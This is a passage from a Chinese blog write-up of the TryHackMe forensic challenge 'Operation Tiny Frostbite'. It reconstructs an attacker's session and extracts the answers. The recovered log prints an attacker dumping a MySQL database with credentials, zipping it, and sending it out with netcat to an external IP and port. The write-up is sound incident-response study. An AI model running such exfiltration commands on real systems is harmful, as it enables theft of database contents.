&#x27;show tables;&#x27;</span><br><span class="line">→ mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">→ +-----------------+</span><br><span class="line">→ | Tables_in_elves |</span><br><span class="line">→ +-----------------+</span><br><span class="line">→ | elf             |</span><br><span class="line">→ +-----------------+</span><br><span class="line">→ root@database:/tmp# mysqldump -u mcskidy -p&#x27;aBT4ZfhteNRE3ah&#x27; elves elf &gt; elves.sql</span><br><span class="line">→ mysqldump: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">→ root@database:/tmp# zip -P 9jYW5fRW5jcnlwVF9iVXR elves.zip elves.sql</span><br><span class="line">→   adding: elves.sql (deflated 58%)</span><br><span class="line">→ root@database:/tmp# nc -w 3 10.13.44.207 9002 &lt; elves.zip</span><br><span class="line">→ root@database:/tmp# echo &#x27;GG EZ McSkidy&#x27; &gt; /home/mcskidy/haha.txt</span><br><span class="line">→ root@database:/tmp# </span><br><span class="line">[info] Done.</span><br></pre></td></tr></table></figure>
<p>我们仔细寻找，可以发现有一条zip压缩命令，就是我们要寻找的密码</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f74d6ce51b9a7f379cbdc659c3d45ef5.png" alt="f74d6ce51b9a7f379cbdc659c3d45ef5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9jYW5fRW5jcnlwVF9iVXR</span><br></pre></td></tr></table></figure>
<h1 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">What is McSkidy&#x27;s password that was inside the database file stolen by the attacker?</span><br><span class="line">McSkidy的密码是什么</span><br></pre></td></tr></table></figure>
<p>我们用密码解压zip包，打开可以看到如下</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202221242224.png" alt="image-20241202221242224"></p>
<p>打开后可以看到密码</p>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f6a0c7c14a0ee706fd71fa7dd988dc71.png" alt="f6a0c7c14a0ee706fd71fa7dd988dc71"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">faXRfSXNfTjB0X0YwMGxwcm8wZn0=</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazyload.gif" data-original="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241202221416713.png" alt="image-20241202221416713"></p>
<p>很巧妙的一道题，值得多学习反思</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://www.hackborgeous.top">hack_Borgeous</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://www.hackborgeous.top/post/7f542627.html">http://www.hackborgeous.top/post/7f542627.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.hackborgeous.top" target="_blank">Borgeousのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><a class="post-meta__tags" href="/tags/%E6%BA%AF%E6%BA%90/">溯源</a></div><div class="post_share"><div class="social-share" data-image="/img/top_img56.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/lazyload.gif" data-original="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/Alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/lazyload.gif" data-original="/img/Alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/a9b06281.html" title="WuCup网络安全技能大赛WP"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img55.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">WuCup网络安全技能大赛WP</div></div></a></div><div class="next-post pull-right"><a href="/post/7c8f2a59.html" title="第二届“长城杯”信息安全铁人三项赛部分wp"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img57.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第二届“长城杯”信息安全铁人三项赛部分wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/6e024654.html" title="第一届“帕鲁杯”应急响应wp"><img class="cover" src="/img/lazyload.gif" data-original="/img/top_img35.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-09</div><div class="title">第一届“帕鲁杯”应急响应wp</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/lazyload.gif" data-original="/img/AVAtar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">hack_Borgeous</div><div class="author-info__description">阳光洒肩头，仿佛自由人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">138</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">57</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ikun123234"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ikun123234" target="_blank" title="Github"><i class="fab fa-github" style="color: ;"></i></a><a class="social-icon" href="https://qm.qq.com/q/h90oJQceJy" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3167722168@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: ;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">如果在阅读过程中遇到任何问题，请及时评论或留言，看到了会在第一时间回复</div></div><div class="xpand" style="height:200px;"><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas></div><script src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/twopeople1.js"></script><script src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/zdog.dist.js"></script><script id="rendered-js" src="https://npm.elemecdn.com/ethan4116-blog/lib/js/other/two-people/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">题目背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#L1-keycard"><span class="toc-number">2.</span> <span class="toc-text">L1 keycard</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q1"><span class="toc-number">3.</span> <span class="toc-text">Q1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q2"><span class="toc-number">4.</span> <span class="toc-text">Q2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q3"><span class="toc-number">5.</span> <span class="toc-text">Q3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q4"><span class="toc-number">6.</span> <span class="toc-text">Q4</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/7c8f2a59.html" title="第二届“长城杯”信息安全铁人三项赛部分wp"><img src="/img/lazyload.gif" data-original="/img/top_img57.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第二届“长城杯”信息安全铁人三项赛部分wp"/></a><div class="content"><a class="title" href="/post/7c8f2a59.html" title="第二届“长城杯”信息安全铁人三项赛部分wp">第二届“长城杯”信息安全铁人三项赛部分wp</a><time datetime="2024-12-16T13:40:02.000Z" title="发表于 2024-12-16 21:40:02">2024-12-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/7f542627.html" title="THM L1 Operation Tiny Frostbite"><img src="/img/lazyload.gif" data-original="/img/top_img56.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="THM L1 Operation Tiny Frostbite"/></a><div class="content"><a class="title" href="/post/7f542627.html" title="THM L1 Operation Tiny Frostbite">THM L1 Operation Tiny Frostbite</a><time datetime="2024-12-02T12:25:46.000Z" title="发表于 2024-12-02 20:25:46">2024-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/a9b06281.html" title="WuCup网络安全技能大赛WP"><img src="/img/lazyload.gif" data-original="/img/top_img55.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WuCup网络安全技能大赛WP"/></a><div class="content"><a class="title" href="/post/a9b06281.html" title="WuCup网络安全技能大赛WP">WuCup网络安全技能大赛WP</a><time datetime="2024-12-01T11:04:35.000Z" title="发表于 2024-12-01 19:04:35">2024-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/877c20e5.html" title="红日靶场-5"><img src="/img/lazyload.gif" data-original="/img/top_img54.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场-5"/></a><div class="content"><a class="title" href="/post/877c20e5.html" title="红日靶场-5">红日靶场-5</a><time datetime="2024-11-29T13:19:07.000Z" title="发表于 2024-11-29 21:19:07">2024-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f07b1073.html" title="红日靶场-4"><img src="/img/lazyload.gif" data-original="/img/top_img53.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场-4"/></a><div class="content"><a class="title" href="/post/f07b1073.html" title="红日靶场-4">红日靶场-4</a><time datetime="2024-11-24T06:00:58.000Z" title="发表于 2024-11-24 14:00:58">2024-11-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/top_img56.png)"><div id="footer-wrap"><div class="copyright">&copy;2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> hack_Borgeous</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.<p><a target="_blank" href="https://hexo.io/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://www.jsdelivr.com/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速"></a> &nbsp;<a target="_blank" href="https://vercel.com/ "><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel"></a>&nbsp;<a target="_blank" href="https://vercel.com/ "><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="/img/lazyload.gif" data-original="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://my-twikoo-opal.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://my-twikoo-opal.vercel.app/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))

    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(init,0)
    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.31/dist/twikoo.all.min.js').then(init)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async src="/js/title.js"></script><script async src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script src="/js/fish.js"></script><script src="/js/bilibili-banner.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/categoryBar/categoryBar.css"><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_anzhiyu_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/lazyload.gif" data-original="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock_anzhiyu')
    if(parent_div_git) {
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
  var gaud_map_key = '5e02e3f682596d2384652be789b5c03e';
  var baidu_ak_key = 'undefined';
  var flag = 0;
  var clock_rectangle = '112.982279,28.19409';
  var clock_default_rectangle_enable = 'false';

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_anzhiyu_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_anzhiyu_injector_config();
  }
  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end -->
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-20},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>